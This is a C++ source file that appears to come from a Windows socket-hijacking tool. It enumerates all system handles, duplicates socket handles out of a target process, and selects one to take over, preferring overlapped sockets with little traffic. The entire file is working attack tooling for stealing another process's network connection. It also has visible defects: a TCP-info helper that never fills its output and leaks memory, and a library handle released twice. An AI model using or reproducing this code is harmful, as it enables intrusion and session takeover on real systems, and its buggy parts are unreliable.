#include "hijacking.h"


bool IsSocketHandle(HANDLE hHandle)
{
    bool bRes = false;
    HMODULE hMod = LoadLibrary(_T("ntdll.dll"));
    if (hMod)
    {
        NtQueryObjectPtr NtQueryObject = (NtQueryObjectPtr)::GetProcAddress(hMod, "NtQueryObject");
        if (NtQueryObject)
        {
            ULONG OutSize = 0;
            NTSTATUS NtStatus = NtQueryObject(hHandle, ObjectTypeInformation, NULL, 0, &OutSize);
            vector<BYTE> buffer(OutSize);
            PPUBLIC_OBJECT_TYPE_INFORMATION TypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)&buffer[0];
            ULONG InSize = OutSize;
            NtStatus = NtQueryObject(hHandle, ObjectTypeInformation, TypeInfo, InSize, &OutSize);
            bRes = (0 == wcscmp(_T("\\Device\\Afd"), CString(TypeInfo->TypeName.Buffer, TypeInfo->TypeName.Length).GetBuffer()));
        }
        FreeLibrary(hMod);
    }
    return bRes;
}


SOCKET_LIST FilterAndOrderSocketsByBytesIn(SOCKET_LIST& lstSocks)
{
    list<SOCKET_BYTESIN> lstSocketsBytesIn = list<SOCKET_BYTESIN>();
    SOCKET_LIST lstSocketsOut = SOCKET_LIST();
    for(auto it = lstSocks.begin(); it != lstSocks.end(); ++it)
    {
        SOCKET hSock = *it;
        TCP_INFO_v0 sockInfo;
        if (!GetSocketTcpInfo(*it, &sockInfo))
        {
            closesocket(hSock);
        }
        else
        {
            if (sockInfo.State == TCPSTATE::TCPSTATE_SYN_RCVD || sockInfo.State == TCPSTATE::TCPSTATE_ESTABLISHED)
            {
                SOCKET_BYTESIN sockBytesIn = { 0 };
                sockBytesIn.sock = hSock;
                sockBytesIn.bytes_in = sockInfo.BytesIn;
                lstSocketsBytesIn.push_back(sockBytesIn);
            }
            else
                closesocket(hSock);
        }
        
    }
    if (lstSocketsBytesIn.size() > 0)
    {
        if (lstSocketsBytesIn.size() > 1)
        {
            // ordering for fewer bytes received by the sockets we have a higher chance to get the proper socket
            lstSocketsBytesIn.sort([](const SOCKET_BYTESIN& sockin1, const SOCKET_BYTESIN& sockin2) { return sockin1.bytes_in < sockin2.bytes_in; });
        }
        for (auto it = lstSocketsBytesIn.begin(); it != lstSocketsBytesIn.end(); ++it)
        {
            lstSocketsOut.push_back(it->sock);
            // Console.WriteLine("debug: Socket handle 0x" + sockBytesIn.handle.ToString("X4") + " total bytes received: " + sockBytesIn.BytesIn.ToString());
        }
    }
    
    return lstSocketsOut;
}

bool GetSocketTcpInfo(SOCKET hSock, TCP_INFO_v0* tcpInfoOut)
{
    tcpInfoOut = NULL;
    int result = -1;
    DWORD tcpInfoVersion = 0;
    DWORD bytesReturned = 0;
    DWORD tcpInfoSize = sizeof(TCP_INFO_v0);
    BYTE *pTcpInfo = new BYTE[tcpInfoSize];
    result = WSAIoctl(hSock, SIO_TCP_INFO, &tcpInfoVersion, sizeof(tcpInfoVersion), pTcpInfo, tcpInfoSize, &bytesReturned, NULL, NULL);
    if (result == 0)
    {
        tcpInfoOut = (TCP_INFO_v0*)pTcpInfo;
    }
    return result == 0;
}

UINT g_CurrentIndex = 0;

DWORD WINAPI ThreadProc(LPVOID lParam)
{
    THREAD_PARAMS* pThreadParam = (THREAD_PARAMS*)lParam;

    for (g_CurrentIndex; g_CurrentIndex < pThreadParam->pSysHandleInformation->dwCount; )
    {
        WaitForSingleObject(pThreadParam->hStartEvent, INFINITE);
        ResetEvent(pThreadParam->hStartEvent);
        pThreadParam->bStatus = false;
        SYSTEM_HANDLE& sh = pThreadParam->pSysHandleInformation->handles[g_CurrentIndex];
        g_CurrentIndex++;
        HANDLE hDup = (HANDLE)sh.wValue;
        HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, sh.dwProcessId);
        if (hProcess)
        {
            bool bRes = DuplicateHandle(hProcess, (HANDLE)sh.wValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS) == TRUE;
            if (bRes != FALSE)
            {
                if (IsSocketHandle(hDup))
                {
                    pThreadParam->bStatus = true;
                }
                else
                {
                    CloseHandle(hDup);
                }
            }
            CloseHandle(hProcess);
        }
        SetEvent(pThreadParam->hFinishedEvent);
    }
    return 0;
}

SOCKET_LIST GetTargetProcessSockets(DWORD dwProcessId)
{
    HRESULT hRes = E_FAIL;
    HANDLE hTargetProcess;
    SOCKET_LIST lstSocks;
    SOCKET_LIST lstDupSockets;
    hTargetProcess = OpenProcess(PROCESS_DUP_HANDLE, false, dwProcessId);
    if (hTargetProcess == NULL)
    {
        cerr << "Cannot open target process with pid " << dwProcessId << " for DuplicateHandle access" << endl;
    }
    else
    {
        // Get the list of all handles in the system
        PSYSTEM_HANDLE_INFORMATION pSysHandleInformation = NULL;
        DWORD size = 0;
        DWORD needed = 0;
        HMODULE hModule = LoadLibrary(_T("ntdll.dll"));
        if (hModule)
        {
            NtQuerySystemInformationPtr NtQuerySystemInformation = (NtQuerySystemInformationPtr)GetProcAddress(hModule, "NtQuerySystemInformation");
            if (NULL == NtQuerySystemInformation)
            {
                cerr << "GetProcAddress failed for NtQuerySystemInformation" << endl;
            }
            else
            {
                NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pSysHandleInformation, size, &needed);
                if (!NT_SUCCESS(status))
                {
                    if (0 == needed)
                    {
                        cerr << "NtQuerySystemInformatio failed" << endl;
                    }
                    else
                    {
                        // The previously supplied buffer wasn't enough.
                        size = needed;
                        BYTE* rawSystemHandleInformation = new BYTE[size];
                        pSysHandleInformation = (PSYSTEM_HANDLE_INFORMATION)rawSystemHandleInformation;
                        status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, pSysHandleInformation, size, &needed);
                        if (!NT_SUCCESS(status))
                        {
                            // some other error so quit.
                            delete pSysHandleInformation;
                        }
                        else
                        {
                            // No error so far
                            // Start thread for NtQueryObject call
                            g_CurrentIndex = 0;
                            THREAD_PARAMS ThreadParams = { 0 };
                            ThreadParams.pSysHandleInformation = pSysHandleInformation;
                            ThreadParams.hStartEvent = ::CreateEvent(0, TRUE, FALSE, 0);
                            ThreadParams.hFinishedEvent = ::CreateEvent(0, TRUE, FALSE, 0);
                            HANDLE hThread = NULL;
                            while (g_CurrentIndex < pSysHandleInformation->dwCount)
                            {
                                HANDLE hCurrentHandle = (HANDLE)pSysHandleInformation->handles[g_CurrentIndex].wValue;
                                if (!hThread)
                                {
                                    hThread = CreateThread(0, 0, ThreadProc, &ThreadParams, 0, 0);
                                }
                                if (hThread && ThreadParams.hFinishedEvent && ThreadParams.hStartEvent)
                                {
                                    ResetEvent(ThreadParams.hFinishedEvent);
                                    SetEvent(ThreadParams.hStartEvent);
                                    if (WAIT_TIMEOUT == WaitForSingleObject(ThreadParams.hFinishedEvent, 100))
                                    {
                                        CString csError;
                                        csError.Format(L"Query hang for handle %p", hCurrentHandle);
                                        OutputDebugString(csError);
                                        TerminateThread(hThread, 0);
                                        CloseHandle(hThread);
                                        hThread = NULL;
                                    }
                                    else
                                    {
                                        if (ThreadParams.bStatus)
                                        {
                                            lstDupSockets.push_back((SOCKET)hCurrentHandle);
                                        }
                                    }
                                }
                                else
                                    break;
                            }
                            delete[] rawSystemHandleInformation;
                            rawSystemHandleInformation = NULL;
                            pSysHandleInformation = NULL;
                            if (lstDupSockets.size() > 0)
                            {
                                lstSocks = FilterAndOrderSocketsByBytesIn(lstDupSockets);
                            }
                        }
                    }
                }
                FreeModule(hModule);
            }
            FreeLibrary(hModule);
        }
        else
        {
            cerr << "Failed to get module ntdll.dll" << endl;
        }
    }
    return lstSocks;
}


bool IsSocketOverlapped(SOCKET hSock)
{
    bool bRes = false;
    HMODULE hMod = LoadLibrary(_T("ntdll.dll"));
    if (hMod != NULL && hMod != INVALID_HANDLE_VALUE)
    {
        NtCreateEventPtr NtCreateEvent = (NtCreateEventPtr)::GetProcAddress(hMod, "NtCreateEvent");
        if (NtCreateEvent != NULL)
        {
            HANDLE hNtEvent = NULL;
            int ntStatus = -1;
            SOCKET_CONTEXT contextData;
            memset(&contextData, 0, sizeof(SOCKET_CONTEXT));
            ntStatus = NtCreateEvent(&hNtEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, false);
            if (NT_SUCCESS(ntStatus) && hNtEvent != NULL && hNtEvent != INVALID_HANDLE_VALUE)
            {
                NtDeviceIoControlFilePtr NtDeviceIoControlFile = (NtDeviceIoControlFilePtr)::GetProcAddress(hMod, "NtDeviceIoControlFile");
                if (NtDeviceIoControlFile != NULL)
                {
                    IO_STATUS_BLOCK IOSB;
                    ntStatus = NtDeviceIoControlFile((HANDLE)hSock, hNtEvent, NULL, NULL, &IOSB, IOCTL_AFD_GET_CONTEXT, NULL, 0, &contextData, sizeof(contextData));
                    // Wait for Completion 
                    if (ntStatus == NTSTATUS_PENDING)
                    {
                        WaitForSingleObject(hNtEvent, INFINITE);
                        ntStatus = IOSB.Status;
                    }
                    CloseHandle(hNtEvent);

                    if (NT_SUCCESS(ntStatus))
                    {
                        if ((contextData.SharedData.CreationFlags & WSA_FLAG_OVERLAPPED) != 0) bRes = true;
                    }
                    
                }
            }
        }
    }
    return bRes;
}

bool IsSocketInherited(SOCKET hSock, DWORD dwProcessId)
{
    bool bInherited = false;
    SOCKET_LIST lstParentSocks = GetTargetProcessSockets(dwProcessId);
    if (lstParentSocks.size() > 0)
    {
        for(auto it = lstParentSocks.begin(); it != lstParentSocks.end(); ++it)
        {
            SOCKET hParentSock = *it;
            SOCKADDR_IN sockaddrTargetProcess = { 0 };
            SOCKADDR_IN sockaddrParentProcess = { 0 };
            int iSockAddrTargetProcessLen = sizeof(sockaddrTargetProcess), iSockAddrParentProcessLen = sizeof(sockaddrParentProcess);
            if (
                (getpeername(hSock, (sockaddr*)&sockaddrTargetProcess, &iSockAddrTargetProcessLen) == 0) &&
                (getpeername(hParentSock, (sockaddr*)&sockaddrParentProcess, &iSockAddrParentProcessLen) == 0) &&
                (sockaddrTargetProcess.sin_addr.S_un.S_addr == sockaddrParentProcess.sin_addr.S_un.S_addr && 
                    sockaddrTargetProcess.sin_port == sockaddrParentProcess.sin_port)
                )
            {
                bInherited = true;
            }
            closesocket(hParentSock);
        }
    }
    return bInherited;
}

SOCKET DuplicateTargetProcessSocket(DWORD dwProcessId, bool& bOverlappedSocket)
{
    bOverlappedSocket = false;
    SOCKET hSock = INVALID_SOCKET;
    SOCKET_LIST lstSocks = GetTargetProcessSockets(dwProcessId);
    if (lstSocks.size() > 0)
    {
        for(auto it = lstSocks.begin(); it != lstSocks.end(); ++it)
        {
            SOCKET hCandidateSock = *it;
            // we prioritize the hijacking of Overlapped sockets
            if (IsSocketOverlapped(hCandidateSock))
            {
                hSock = hCandidateSock;
                bOverlappedSocket = true;
                break;
            }
        }
        // no Overlapped sockets found, We try with the first socket
        if (hSock == INVALID_SOCKET) 
        {
            cerr << "debug: No overlapped sockets found. Trying to return also non-overlapped sockets..." << endl;
            hSock = lstSocks.front();
        }
        // close duplicated socket handle not returned to avoid leaking handles.
        for (auto it = lstSocks.begin(); it != lstSocks.end(); ++it)
        {
            if (*it != hSock) closesocket(*it);
        }
    }
    return hSock;
}

bool SetSocketBlockingMode(SOCKET hSock, int iMode)
{
    // iMode == 1 => non blocking else blocking
    ULONG ulNonBlocking = iMode == 1 ? 1 : 0;
    int iResult = ioctlsocket(hSock, FIONBIO, &ulNonBlocking);
    if (iResult != 0)
        cerr << _T("ioctlsocket failed with return code ") << iResult << _T(" and wsalasterror: ") << WSAGetLastError() << endl;
    return iResult == 0;
}

int InitWSAThread()
{
    WSADATA WSAData;
    return WSAStartup(MAKEWORD(2, 0), &WSAData);
}

void ShutdownWSAThread()
{
    WSACleanup();
}